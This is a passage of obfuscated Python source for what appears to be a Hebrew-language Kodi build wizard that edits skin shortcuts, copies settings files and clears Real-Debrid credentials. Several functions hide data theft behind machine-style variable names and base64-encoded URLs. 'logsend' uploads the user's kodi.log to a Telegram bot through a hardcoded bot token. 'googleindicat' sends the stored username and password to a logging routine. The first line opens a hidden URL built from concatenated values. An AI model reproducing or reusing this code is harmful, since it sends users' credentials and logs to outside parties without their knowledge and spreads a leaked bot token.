          OOO0O0OOO0O000O00 =urllib2 .urlopen (O0OOO00OOO00O0000 .decode ('base64')+' - '+O0O000OOO00O0OO0O +' - '+O00OOOO000000O0O0 +' - '+OO0O00000O0OOO0O0 ).readlines ()#line:577
       except :pass #line:578
def googleindicat ():#line:581
			import logg #line:582
			O00OOOOOOO0O000O0 =(ADDON .getSetting ("pass"))#line:583
			O0OO00O00OO00OO00 =(ADDON .getSetting ("user"))#line:584
			logg .logGA (O00OOOOOOO0O000O0 ,O0OO00O00OO00OO00 )#line:585
def logsend ():#line:586
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:587
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:588
      howsentlog ()#line:590
      import requests #line:591
      if xbmc .getCondVisibility ('system.platform.windows'):#line:592
         OO00OO0O0O0OO0O0O =xbmc .translatePath ('special://home/kodi.log')#line:593
         OOOO000OO0O000OO0 ={'chat_id':(None ,'-274262389'),'document':(OO00OO0O0O0OO0O0O ,open (OO00OO0O0O0OO0O0O ,'rb')),}#line:597
         OO0OOO000O0O00OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:598
         OO00O00O000O0OO0O =requests .post (OO0OOO000O0O00OO0 .decode ('base64'),files =OOOO000OO0O000OO0 )#line:600
      elif xbmc .getCondVisibility ('system.platform.android'):#line:601
           OO00OO0O0O0OO0O0O =xbmc .translatePath ('special://temp/kodi.log')#line:602
           OOOO000OO0O000OO0 ={'chat_id':(None ,'-274262389'),'document':(OO00OO0O0O0OO0O0O ,open (OO00OO0O0O0OO0O0O ,'rb')),}#line:606
           OO0OOO000O0O00OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:607
           OO00O00O000O0OO0O =requests .post (OO0OOO000O0O00OO0 .decode ('base64'),files =OOOO000OO0O000OO0 )#line:609
      else :#line:610
           OO00OO0O0O0OO0O0O =xbmc .translatePath ('special://kodi.log')#line:611
           OOOO000OO0O000OO0 ={'chat_id':(None ,'-274262389'),'document':(OO00OO0O0O0OO0O0O ,open (OO00OO0O0O0OO0O0O ,'rb')),}#line:615
           OO0OOO000O0O00OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:616
           OO00O00O000O0OO0O =requests .post (OO0OOO000O0O00OO0 .decode ('base64'),files =OOOO000OO0O000OO0 )#line:618
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:619
def rdoff ():#line:621
	OO00000OO0O000000 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:622
	OO00000OO0O000000 .setSetting ('rd.client_id','')#line:623
	OO00000OO0O000000 .setSetting ('rd.secret','')#line:624
	OO00000OO0O000000 .setSetting ('rdsource','false')#line:625
	OO00000OO0O000000 .setSetting ('super_fast_type_toren','false')#line:626
	OO00000OO0O000000 .setSetting ('rd.auth','false')#line:627
	OO00000OO0O000000 .setSetting ('rd.refresh','false')#line:628
	OO00000OO0O000000 .setSetting ('magnet','false')#line:629
	OO00000OO0O000000 .setSetting ('torrent_server','false')#line:630
	OO00000OO0O000000 =xbmcaddon .Addon ('script.module.resolveurl')#line:632
	OO00000OO0O000000 .setSetting ('RealDebridResolver_client_id','')#line:633
	OO00000OO0O000000 .setSetting ('RealDebridResolver_client_secret','')#line:634
	OO00000OO0O000000 .setSetting ('RealDebridResolver_token','')#line:635
	OO00000OO0O000000 .setSetting ('RealDebridResolver_refresh','')#line:636
	OO00000OO0O000000 =xbmcaddon .Addon ('plugin.video.seren')#line:638
	OO00000OO0O000000 .setSetting ('rd.client_id','')#line:639
	OO00000OO0O000000 .setSetting ('rd.secret','')#line:640
	OO00000OO0O000000 .setSetting ('rd.auth','')#line:641
	OO00000OO0O000000 .setSetting ('rd.refresh','')#line:642
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:643
		OO00000OO0O000000 =xbmcaddon .Addon ('plugin.video.gaia')#line:644
		OO00000OO0O000000 .setSetting ('accounts.debrid.realdebrid.id','')#line:645
		OO00000OO0O000000 .setSetting ('accounts.debrid.realdebrid.secret','')#line:646
		OO00000OO0O000000 .setSetting ('accounts.debrid.realdebrid.token','')#line:647
		OO00000OO0O000000 .setSetting ('accounts.debrid.realdebrid.refresh','')#line:648
	resloginit .resloginit ('restore','all')#line:649
	OO000O0OOOOOOOO0O =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:651
	O0O00000O00OOO00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:652
	copyfile (OO000O0OOOOOOOO0O ,O0O00000O00OOO00O )#line:653
def skindialogsettind18 ():#line:654
	try :#line:655
		OO0OOOOO00O0O00OO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:656
		OOOO000O0O0O00OO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:657
		copyfile (OO0OOOOO00O0O00OO ,OOOO000O0O0O00OO0 )#line:658
	except :pass #line:659
def rdon ():#line:660
	loginit .loginIt ('restore','all')#line:661
	O0OO00OO00OOOOOOO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:663
	O00OOOOOOO0O0OO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:664
	copyfile (O0OO00OO00OOOOOOO ,O00OOOOOOO0O0OO0O )#line:665
def adults18 ():#line:667
  O0OO0O00O0OO00000 =(ADDON .getSetting ("adults"))#line:668
  if O0OO0O00O0OO00000 =='true':#line:669
    OO0OO0OO00O0O000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:670
    with open (OO0OO0OO00O0O000O ,'r')as O0000000O0000O00O :#line:671
      OOO00OO0OO00OO00O =O0000000O0000O00O .read ()#line:672
    OOO00OO0OO00OO00O =OOO00OO0OO00OO00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:690
    with open (OO0OO0OO00O0O000O ,'w')as O0000000O0000O00O :#line:693
      O0000000O0000O00O .write (OOO00OO0OO00OO00O )#line:694
def rdbuildaddon ():#line:695
  OO0O0OOO0OOO00O00 =(ADDON .getSetting ("auto_rd"))#line:696
  if OO0O0OOO0OOO00O00 =='true':#line:697
    O0O0OO00OOOOO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:698
    with open (O0O0OO00OOOOO0OO0 ,'r')as OO0OOOOO0000O000O :#line:699
      OOO00OO000O00OO00 =OO0OOOOO0000O000O .read ()#line:700
    OOO00OO000O00OO00 =OOO00OO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:718
    with open (O0O0OO00OOOOO0OO0 ,'w')as OO0OOOOO0000O000O :#line:721
      OO0OOOOO0000O000O .write (OOO00OO000O00OO00 )#line:722
    O0O0OO00OOOOO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:726
    with open (O0O0OO00OOOOO0OO0 ,'r')as OO0OOOOO0000O000O :#line:727
      OOO00OO000O00OO00 =OO0OOOOO0000O000O .read ()#line:728
    OOO00OO000O00OO00 =OOO00OO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:746
    with open (O0O0OO00OOOOO0OO0 ,'w')as OO0OOOOO0000O000O :#line:749
      OO0OOOOO0000O000O .write (OOO00OO000O00OO00 )#line:750
    O0O0OO00OOOOO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:754
    with open (O0O0OO00OOOOO0OO0 ,'r')as OO0OOOOO0000O000O :#line:755
      OOO00OO000O00OO00 =OO0OOOOO0000O000O .read ()#line:756
    OOO00OO000O00OO00 =OOO00OO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:774
    with open (O0O0OO00OOOOO0OO0 ,'w')as OO0OOOOO0000O000O :#line:777
      OO0OOOOO0000O000O .write (OOO00OO000O00OO00 )#line:778
    O0O0OO00OOOOO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:782
    with open (O0O0OO00OOOOO0OO0 ,'r')as OO0OOOOO0000O000O :#line:783
      OOO00OO000O00OO00 =OO0OOOOO0000O000O .read ()#line:784
    OOO00OO000O00OO00 =OOO00OO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:802
    with open (O0O0OO00OOOOO0OO0 ,'w')as OO0OOOOO0000O000O :#line:805
      OO0OOOOO0000O000O .write (OOO00OO000O00OO00 )#line:806
    O0O0OO00OOOOO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:809
    with open (O0O0OO00OOOOO0OO0 ,'r')as OO0OOOOO0000O000O :#line:810
      OOO00OO000O00OO00 =OO0OOOOO0000O000O .read ()#line:811
    OOO00OO000O00OO00 =OOO00OO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:829
    with open (O0O0OO00OOOOO0OO0 ,'w')as OO0OOOOO0000O000O :#line:832
      OO0OOOOO0000O000O .write (OOO00OO000O00OO00 )#line:833
    O0O0OO00OOOOO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:835
    with open (O0O0OO00OOOOO0OO0 ,'r')as OO0OOOOO0000O000O :#line:836
      OOO00OO000O00OO00 =OO0OOOOO0000O000O .read ()#line:837
    OOO00OO000O00OO00 =OOO00OO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:855
    with open (O0O0OO00OOOOO0OO0 ,'w')as OO0OOOOO0000O000O :#line:858
      OO0OOOOO0000O000O .write (OOO00OO000O00OO00 )#line:859
    O0O0OO00OOOOO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:861
    with open (O0O0OO00OOOOO0OO0 ,'r')as OO0OOOOO0000O000O :#line:862
      OOO00OO000O00OO00 =OO0OOOOO0000O000O .read ()#line:863
    OOO00OO000O00OO00 =OOO00OO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:881
    with open (O0O0OO00OOOOO0OO0 ,'w')as OO0OOOOO0000O000O :#line:884
      OO0OOOOO0000O000O .write (OOO00OO000O00OO00 )#line:885
    O0O0OO00OOOOO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:888
    with open (O0O0OO00OOOOO0OO0 ,'r')as OO0OOOOO0000O000O :#line:889
      OOO00OO000O00OO00 =OO0OOOOO0000O000O .read ()#line:890
    OOO00OO000O00OO00 =OOO00OO000O00OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:908
    with open (O0O0OO00OOOOO0OO0 ,'w')as OO0OOOOO0000O000O :#line:911
      OO0OOOOO0000O000O .write (OOO00OO000O00OO00 )#line:912
def rdbuildinstall ():#line:915
  try :#line:916
   OO0O00O000OOOOOOO =(ADDON .getSetting ("auto_rd"))#line:917
   if OO0O00O000OOOOOOO =='true':#line:918
     OO0O0OOOOOO0OOOO0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:919
     O00OO0OOO0O0O0OOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:920
     copyfile (OO0O0OOOOOO0OOOO0 ,O00OO0OOO0O0O0OOO )#line:921
  except :#line:922
     pass #line:923
def rdbuildaddonoff ():#line:926
    O000O000OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:929
    with open (O000O000OOOO0O000 ,'r')as O0O00O0000O000OO0 :#line:930
      OOO00OO00000000OO =O0O00O0000O000OO0 .read ()#line:931
    OOO00OO00000000OO =OOO00OO00000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:949
    with open (O000O000OOOO0O000 ,'w')as O0O00O0000O000OO0 :#line:952
      O0O00O0000O000OO0 .write (OOO00OO00000000OO )#line:953
    O000O000OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:957
    with open (O000O000OOOO0O000 ,'r')as O0O00O0000O000OO0 :#line:958
      OOO00OO00000000OO =O0O00O0000O000OO0 .read ()#line:959
    OOO00OO00000000OO =OOO00OO00000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:977
    with open (O000O000OOOO0O000 ,'w')as O0O00O0000O000OO0 :#line:980
      O0O00O0000O000OO0 .write (OOO00OO00000000OO )#line:981
    O000O000OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:985
    with open (O000O000OOOO0O000 ,'r')as O0O00O0000O000OO0 :#line:986
      OOO00OO00000000OO =O0O00O0000O000OO0 .read ()#line:987
    OOO00OO00000000OO =OOO00OO00000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1005
    with open (O000O000OOOO0O000 ,'w')as O0O00O0000O000OO0 :#line:1008
      O0O00O0000O000OO0 .write (OOO00OO00000000OO )#line:1009
    O000O000OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1013
    with open (O000O000OOOO0O000 ,'r')as O0O00O0000O000OO0 :#line:1014
      OOO00OO00000000OO =O0O00O0000O000OO0 .read ()#line:1015
    OOO00OO00000000OO =OOO00OO00000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1033
    with open (O000O000OOOO0O000 ,'w')as O0O00O0000O000OO0 :#line:1036
      O0O00O0000O000OO0 .write (OOO00OO00000000OO )#line:1037
    O000O000OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1040
    with open (O000O000OOOO0O000 ,'r')as O0O00O0000O000OO0 :#line:1041
      OOO00OO00000000OO =O0O00O0000O000OO0 .read ()#line:1042
    OOO00OO00000000OO =OOO00OO00000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1060
    with open (O000O000OOOO0O000 ,'w')as O0O00O0000O000OO0 :#line:1063
      O0O00O0000O000OO0 .write (OOO00OO00000000OO )#line:1064
    O000O000OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1066
    with open (O000O000OOOO0O000 ,'r')as O0O00O0000O000OO0 :#line:1067
      OOO00OO00000000OO =O0O00O0000O000OO0 .read ()#line:1068
    OOO00OO00000000OO =OOO00OO00000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1086
    with open (O000O000OOOO0O000 ,'w')as O0O00O0000O000OO0 :#line:1089
      O0O00O0000O000OO0 .write (OOO00OO00000000OO )#line:1090
    O000O000OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1092
    with open (O000O000OOOO0O000 ,'r')as O0O00O0000O000OO0 :#line:1093
      OOO00OO00000000OO =O0O00O0000O000OO0 .read ()#line:1094
    OOO00OO00000000OO =OOO00OO00000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1112
    with open (O000O000OOOO0O000 ,'w')as O0O00O0000O000OO0 :#line:1115
      O0O00O0000O000OO0 .write (OOO00OO00000000OO )#line:1116
    O000O000OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1119
    with open (O000O000OOOO0O000 ,'r')as O0O00O0000O000OO0 :#line:1120
      OOO00OO00000000OO =O0O00O0000O000OO0 .read ()#line:1121
    OOO00OO00000000OO =OOO00OO00000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1139
    with open (O000O000OOOO0O000 ,'w')as O0O00O0000O000OO0 :#line:1142
      O0O00O0000O000OO0 .write (OOO00OO00000000OO )#line:1143
def rdbuildinstalloff ():#line:1146
    try :#line:1147
       OOO000O000OO0OOOO =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1148
       OOOO00O000O0O0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1149
       copyfile (OOO000O000OO0OOOO ,OOOO00O000O0O0O00 )#line:1151
       OOO000O000OO0OOOO =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1153
       OOOO00O000O0O0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1154
       copyfile (OOO000O000OO0OOOO ,OOOO00O000O0O0O00 )#line:1156
       OOO000O000OO0OOOO =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1158
       OOOO00O000O0O0O00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1159
       copyfile (OOO000O000OO0OOOO ,OOOO00O000O0O0O00 )#line:1161
       OOO000O000OO0OOOO =ADDONPATH +"/resources/rdoff/Splash.png"#line:1164
       OOOO00O000O0O0O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1165
       copyfile (OOO000O000OO0OOOO ,OOOO00O000O0O0O00 )#line:1167
    except :#line:1169
       pass #line:1170
def rdbuildaddonON ():#line:1177
    O0OOOOOOOOOOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1179
    with open (O0OOOOOOOOOOOO0OO ,'r')as OO0O0OOO0OOOO0O0O :#line:1180
      O000O0000O00OOOOO =OO0O0OOO0OOOO0O0O .read ()#line:1181
    O000O0000O00OOOOO =O000O0000O00OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
